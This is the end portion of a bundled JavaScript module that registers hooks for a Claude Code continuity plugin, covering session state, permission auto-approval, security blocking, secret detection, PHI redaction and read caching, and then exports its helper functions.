    return outputSilentSuccess();
  }
}

// src/index.ts
var hooks = /* @__PURE__ */ new Map();
function registerHook(name, description, handler) {
  hooks.set(name, { name, description, handler });
}
function getHook(name) {
  return hooks.get(name);
}
function listHooks() {
  return Array.from(hooks.keys());
}
function hasHook(name) {
  return hooks.has(name);
}
function unregisterHook(name) {
  return hooks.delete(name);
}
function clearHooks() {
  hooks.clear();
}
registerHook("lifecycle/session-loader", "Load continuity context at session start", sessionLoader);
registerHook("lifecycle/session-end", "Mark session as cleanly ended", sessionEnd);
registerHook(
  "lifecycle/pre-compact-saver",
  "Save state before context compaction",
  preCompactSaver
);
registerHook(
  "pretool/security-blocker",
  "Block dangerous operations (security-critical)",
  securityBlocker
);
registerHook(
  "permission/auto-approve-safe-bash",
  "Auto-approve read-only bash commands",
  autoApproveSafeBash
);
registerHook(
  "permission/auto-approve-project-writes",
  "Auto-approve safe file writes within project",
  autoApproveProjectWrites
);
registerHook(
  "permission/profile-evaluator",
  "Evaluate operations against declarative permission profiles",
  profileEvaluator
);
registerHook(
  "permission/permission-request-combined",
  "Auto-approve on permission dialog (PermissionRequest event)",
  permissionRequestCombined
);
registerHook(
  "pretool/git-validator",
  "Validate git commit messages and branch names",
  gitValidator
);
registerHook(
  "pretool/bash-combined",
  "Combined Bash validation (safe-bash, profile, git-validator, security)",
  bashCombined
);
registerHook(
  "pretool/preflight-context-injector",
  "Inject pwd/branch/remote/worktree context before destructive commands",
  preflightContextInjector
);
registerHook(
  "pretool/write-combined",
  "Combined Write/Edit validation (project-writes, profile, security)",
  writeCombined
);
registerHook(
  "posttool/dirty-state-tracker",
  "Track file edits for dirty flag auto-handoff",
  dirtyStateTracker
);
registerHook(
  "prompt/context-monitor",
  "Inject context window usage warnings at tier thresholds",
  contextMonitor
);
registerHook(
  "posttool/secret-detector",
  "Detect leaked secrets in command output and warn user",
  secretDetector
);
registerHook(
  "posttool/error-warner",
  "Provide helpful tips for common errors in command output",
  errorWarner
);
registerHook(
  "posttool/failure-logger",
  "Log tool failures and provide contextual fix hints",
  failureLogger
);
registerHook(
  "posttool/lint-checker",
  "Run ruff on Python files after write operations and report lint errors",
  lintChecker
);
registerHook(
  "lifecycle/instructions-loaded",
  "Log and validate loaded CLAUDE.md files",
  instructionsLoaded
);
registerHook(
  "lifecycle/teammate-idle-saver",
  "Auto-save continuity state on teammate idle",
  teammateIdleSaver
);
registerHook("lifecycle/task-completed-logger", "Log task completion metrics", taskCompletedLogger);
registerHook("lifecycle/task-created-logger", "Log task creation events", taskCreatedLogger);
registerHook(
  "lifecycle/worktree-create",
  "Initialize continuity for new worktrees",
  worktreeCreate
);
registerHook(
  "lifecycle/worktree-remove",
  "Archive continuity state for removed worktrees",
  worktreeRemove
);
registerHook(
  "lifecycle/stop-state-saver",
  "Capture final session state on Claude stop",
  stopStateSaver
);
registerHook(
  "lifecycle/stop-failure-handler",
  "Log API errors that terminate a turn (StopFailure event)",
  stopFailureHandler
);
registerHook(
  "posttool/review-logger",
  "Log review submissions to JSONL history file",
  reviewLogger
);
registerHook(
  "permissiondenied/permissiondenied-combined",
  "Combined PermissionDenied: retry safe ops, log denials, notify on repeated denials",
  permissionDeniedCombined
);
registerHook(
  "prompt/hipaa-context-injector",
  "Inject HIPAA compliance context on keyword match (once per session)",
  hipaaContextInjector
);
registerHook(
  "messagedisplay/phi-output-redactor",
  "Redact high-confidence PHI/PII patterns in assistant output (opt-in via CONTINUITY_PHI_OUTPUT_REDACT=1, CC v2.1.152+)",
  phiOutputRedactor
);
registerHook(
  "prompt/session-title",
  "Auto-set session title from git branch name (once per session, CC 2.1.94+)",
  sessionTitle
);
registerHook(
  "pretool/read-cache",
  "Intercept redundant Read calls and inject a unified diff against the per-session cache",
  readCacheHook
);
registerHook(
  "posttool/read-cache-writer",
  "Persist the just-read file content into the per-session delta cache",
  readCacheWriterHook
);
registerHook(
  "posttool/read-cache-invalidator",
  "Refresh the delta-cache base after Write/Edit/MultiEdit so post-edit reads are not intercepted with a stale diff",
  readCacheInvalidatorHook
);
registerHook(
  "posttool/bash-output-measurer",
  "Record bash command + output sizes for token-savings measurement (Spike B feasibility)",
  bashOutputMeasurerHook
);

export { clearHooks, createLogger, createScopedLogger, getCommand, getContent, getCurrentLogLevel, getField, getFilePath, getHook, getHookEnvironment, getHookLogPath, getLogDir, getNewString, getOldString, getPattern, getPermissionLogPath, getProjectDir, getSessionId, getToolInput, getToolName, getWorktreeBranch, getWorktreePath, hasHook, isBashToolInput, isFileToolInput, isUserPromptInput, listHooks, logDebug, logError, logInfo, logPermission, logPermissionEntry, logWarn, outputAllow, outputAllowWithContext, outputAnswerQuestion, outputAsk, outputDefer, outputDeny, outputPromptContext, outputRetry, outputSessionTitle, outputSilentSuccess, outputStderrWarning, outputStopContext, outputSuccess, outputWarning, outputWithContext, outputWithNotification, parseHookInput, readHookInput, readHookInputAsync, registerHook, resetLogLevel, unregisterHook };
//# sourceMappingURL=index.js.map
//# sourceMappingURL=index.js.map